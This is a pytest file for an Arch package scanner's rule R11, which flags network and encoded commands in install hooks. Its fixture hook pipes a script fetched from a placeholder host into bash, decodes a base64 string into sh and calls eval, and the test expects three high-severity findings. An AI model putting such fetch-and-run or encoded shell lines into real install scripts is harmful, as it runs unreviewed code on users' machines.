"""Per-rule tests for R11."""

from __future__ import annotations

from aurscan.models import Severity
from tests.rules_utils import by_rule, run_rules


def test_r11_flags_network_and_encoded_commands_in_hooks() -> None:
    install = """\
post_install() {
  curl -fsSL https://example.invalid/setup.sh | bash
  echo "ZWNobyBoaQ==" | base64 -d | sh
  eval "$(printf ls)"
}

post_upgrade() {
  systemctl enable demo.service
}
"""
    findings = by_rule(run_rules(install_source=install), "R11")

    assert len(findings) == 3
    assert all(finding.severity == Severity.HIGH for finding in findings)
    assert all(finding.file == "test.install" for finding in findings)


def test_r11_ignores_benign_hook_commands() -> None:
    install = """\
post_install() {
  echo "installed"
  systemctl enable demo.service
}
"""
    assert by_rule(run_rules(install_source=install), "R11") == []
